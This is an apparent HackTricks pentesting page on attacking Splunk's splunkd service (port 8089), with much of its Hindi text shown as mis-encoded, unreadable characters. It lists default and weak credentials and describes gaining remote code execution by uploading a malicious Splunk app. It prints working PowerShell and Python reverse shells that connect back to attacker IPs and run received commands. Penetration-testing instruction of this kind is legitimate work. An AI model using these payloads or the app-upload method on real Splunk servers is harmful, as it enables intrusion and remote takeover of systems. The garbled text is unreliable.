# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä**

* ‡§°‡•á‡§ü‡§æ ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π, ‡§µ‡§ø‡§∂‡•ç‡§≤‡•á‡§∑‡§£ ‡§î‡§∞ ‡§¶‡•É‡§∂‡•ç‡§Ø‡§§‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡•â‡§ó ‡§è‡§®‡§æ‡§≤‡§ø‡§ü‡§ø‡§ï‡•ç‡§∏ ‡§â‡§™‡§ï‡§∞‡§£
* ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§®‡§ø‡§ó‡§∞‡§æ‡§®‡•Ä ‡§î‡§∞ ‡§µ‡•ç‡§Ø‡§æ‡§µ‡§∏‡§æ‡§Ø‡§ø‡§ï ‡§µ‡§ø‡§∂‡•ç‡§≤‡•á‡§∑‡§£ ‡§Æ‡•á‡§Ç ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø‡§§‡§É ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à
* ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§™‡•ã‡§∞‡•ç‡§ü:
* ‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞: 8000
* Splunkd ‡§∏‡•á‡§µ‡§æ: 8089

### ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§µ‡•á‡§ï‡•ç‡§ü‡§∞:

1. ‡§Æ‡•Å‡§´‡•ç‡§§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡§æ ‡§∂‡•ã‡§∑‡§£

* ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ 60 ‡§¶‡§ø‡§®‡•ã‡§Ç ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Æ‡•Å‡§´‡•ç‡§§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§ø‡§§ ‡§π‡•ã ‡§ú‡§æ‡§§‡§æ ‡§π‡•à
* ‡§Æ‡•Å‡§´‡•ç‡§§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡•Ä‡§ï‡§∞‡§£ ‡§ï‡•Ä ‡§ï‡§Æ‡•Ä ‡§π‡•à
* ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§® ‡§ï‡§∞‡§®‡•á ‡§™‡§∞ ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ú‡•ã‡§ñ‡§ø‡§Æ
* ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§®‡§ø‡§π‡§ø‡§§‡§æ‡§∞‡•ç‡§•‡•ã‡§Ç ‡§ï‡•ã ‡§®‡§ú‡§∞‡§Ö‡§Ç‡§¶‡§æ‡§ú ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç

2. ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤ ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡§æ‡§Å

* ‡§™‡•Å‡§∞‡§æ‡§®‡•á ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£: ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤ `admin:changeme`
* ‡§®‡§è ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£: ‡§∏‡•ç‡§•‡§æ‡§™‡§®‡§æ ‡§ï‡•á ‡§¶‡•å‡§∞‡§æ‡§® ‡§∏‡•á‡§ü ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤
* ‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•Ä ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ (‡§ú‡•à‡§∏‡•á, `admin`, `Welcome`, `Password123`)

3. ‡§∞‡§ø‡§Æ‡•ã‡§ü ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§Ö‡§µ‡§∏‡§∞

* ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§ï‡§à ‡§§‡§∞‡•Ä‡§ï‡•á:
* ‡§∏‡§∞‡•ç‡§µ‡§∞-‡§∏‡§æ‡§á‡§° Django ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó
* REST ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü
* ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§á‡§®‡§™‡•Å‡§ü
* ‡§Ö‡§≤‡§∞‡•ç‡§ü‡§ø‡§Ç‡§ó ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü
* ‡§ï‡•ç‡§∞‡•â‡§∏-‡§™‡•ç‡§≤‡•á‡§ü‡§´‡§º‡•â‡§∞‡•ç‡§Æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® (Windows/Linux)
* ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§á‡§®‡§™‡•Å‡§ü ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
* ‡§¨‡•à‡§∂ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü
* ‡§™‡§æ‡§µ‡§∞‡§∂‡•á‡§≤ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü
* ‡§¨‡•à‡§ö ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü

‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§∂‡•ã‡§∑‡§£ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ:

* ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§°‡•á‡§ü‡§æ ‡§≠‡§Ç‡§°‡§æ‡§∞‡§£
* ‡§Æ‡•Å‡§´‡•ç‡§§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡•Ä‡§ï‡§∞‡§£ ‡§ï‡•Ä ‡§ï‡§Æ‡•Ä
* ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡§ø‡§Æ‡•ã‡§ü ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§à ‡§µ‡•á‡§ï‡•ç‡§ü‡§∞
* ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§∏‡§Æ‡§ù‡•å‡§§‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§á‡§®‡§™‡•Å‡§ü ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§®‡•á ‡§ï‡•Ä ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ

### Shodan

* `Splunk build`

## RCE

### ‡§ï‡§∏‡•ç‡§ü‡§Æ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§¨‡§®‡§æ‡§è‡§Ç

Splunk ‡§ï‡§∏‡•ç‡§ü‡§Æ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§§‡•à‡§®‡§æ‡§§‡•Ä ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§∞‡§ø‡§Æ‡•ã‡§ü ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§™‡§∞‡§ø‡§∑‡•ç‡§ï‡•É‡§§ ‡§µ‡§ø‡§ß‡§ø ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã ‡§á‡§∏‡§ï‡•á ‡§ï‡•ç‡§∞‡•â‡§∏-‡§™‡•ç‡§≤‡•á‡§ü‡§´‡§º‡•â‡§∞‡•ç‡§Æ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡§ø‡§Ç‡§ó ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§∂‡•ã‡§∑‡§£ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§ö‡§æ‡§∞‡•ã‡§Ç ‡§ì‡§∞ ‡§ò‡•Ç‡§Æ‡§§‡•Ä ‡§π‡•à ‡§ú‡•ã Windows ‡§î‡§∞ Linux ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§™‡§∞ ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

‡§è‡§ï ‡§ï‡§∏‡•ç‡§ü‡§Æ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® **Python, Batch, Bash, ‡§Ø‡§æ PowerShell ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü** ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, **Splunk ‡§Æ‡•á‡§Ç Python ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§π‡•à**, ‡§á‡§∏‡§≤‡§ø‡§è **Windows** ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§Æ‡•á‡§Ç ‡§≠‡•Ä ‡§Ü‡§™ ‡§™‡§æ‡§Ø‡§•‡§® ‡§ï‡•ã‡§° ‡§ö‡§≤‡§æ ‡§∏‡§ï‡•á‡§Ç‡§ó‡•á‡•§

‡§Ü‡§™ [**‡§á‡§∏**](https://github.com/0xjpuff/reverse_shell_splunk) ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç **`bin`** ‡§Æ‡•á‡§Ç [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) ‡§î‡§∞ [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1) ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç‡•§ ‡§Ø‡§æ ‡§Ü‡§™ ‡§Ö‡§™‡§®‡§æ ‡§ñ‡•Å‡§¶ ‡§ï‡§æ ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§∂‡•ã‡§∑‡§£ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§™‡•ç‡§≤‡•á‡§ü‡§´‡§æ‡§∞‡•ç‡§Æ‡•ã‡§Ç ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§è‡§ï ‡§∏‡•Å‡§∏‡§Ç‡§ó‡§§ ‡§™‡§¶‡•ç‡§ß‡§§‡§ø ‡§ï‡§æ ‡§™‡§æ‡§≤‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à:
```
splunk_shell/
‚îú‚îÄ‚îÄ bin        (reverse shell scripts)
‚îî‚îÄ‚îÄ default    (inputs.conf configuration)
```
The critical configuration file `inputs.conf` enables the script by:

* Setting `disabled = 0`
* Configuring a 10-second execution interval
* Defining the script's source type

Deployment is straightforward:

1. Create the malicious application package
2. Set up a listener (Netcat/socat) on the attacking machine
3. Upload the application through Splunk's interface
4. Trigger automatic script execution upon upload

Sample Windows PowerShell reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
‡§®‡§Æ‡•Ç‡§®‡§æ Linux Python ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

‡§á‡§∏ ‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§∞ ‡§Ü‡§™ ‡§Ø‡§π ‡§∏‡§Æ‡§ù ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§á‡§∏ ‡§∏‡•á‡§µ‡§æ ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡•à‡§∏‡•á ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º‡§æ‡§è ‡§ú‡§æ ‡§∏‡§ï‡•á‡§Ç ‡§î‡§∞ ‡§∏‡•ç‡§•‡§ø‡§∞‡§§‡§æ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡•á:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
